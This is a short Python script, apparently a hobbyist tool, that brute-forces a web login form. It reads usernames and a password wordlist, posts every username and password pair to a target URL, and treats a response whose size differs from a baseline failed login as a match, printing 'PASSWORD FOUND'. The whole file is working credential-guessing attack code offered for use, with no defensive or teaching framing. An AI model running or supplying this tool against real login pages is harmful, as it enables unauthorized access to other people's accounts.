import requests
import sys

url = input("target url: ")
usernames = input("usernames (separate by comma{,}): ")
usernames = usernames.split(',')
file = input("path of the password file: ")

try:
    with open(file, "r", encoding="latin-1") as f:
        pass_list = f.read().splitlines()
except FileNotFoundError:
    print(f"\n[!] Error: The file '{file}' was not found.")
    sys.exit()

print("[*] establishing baseline...")
try:
    wrong_login = requests.post(url, data={'username': 'admin', 'password': 'admin'})
    failure_size = len(wrong_login.content)
except requests.exceptions.ConnectionError:
    print("[!] Connection failed. Check the URL.")
    sys.exit()


for username in usernames:
    found = False
    print(f"\n[*] Starting attack on user: {username}")
    for password in pass_list:
        password = password.encode()
        sys.stdout.write(f"\r[X] Attempting user:password -> {username}:{password.decode()}")
        sys.stdout.flush()
        r= requests.post(url, data={"username": username, "password": password})
        if abs(len(r.content) - failure_size) > 20:
            sys.stdout.write("\n")
            sys.stdout.write(f"[>>>>>>] PASSWORD FOUND: {password} for user {username}\n")
            found = True
            break 
        sys.stdout.flush()
    if not found:
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo pass found for user {username}\n")

print("[*] Scan complete.")       